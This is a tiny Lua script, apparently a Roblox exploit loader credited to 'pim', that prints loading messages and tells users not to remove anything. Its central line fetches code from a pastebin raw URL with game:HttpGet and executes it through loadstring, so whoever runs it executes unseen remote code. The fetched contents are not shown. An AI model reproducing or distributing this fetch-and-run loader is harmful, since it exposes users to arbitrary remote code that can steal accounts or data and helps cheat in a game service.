-- Made By pim do not remove anything of this script because it will break! enjoy pim#4462

local yourmessage = "Script Loading..."
...
loadstring(game:HttpGet("https://pastebin.pl/view/raw/741a61e0"))() 
wait(8)


local yourmessage = "Script has loaded in! enjoy using it credits: pim4462 "
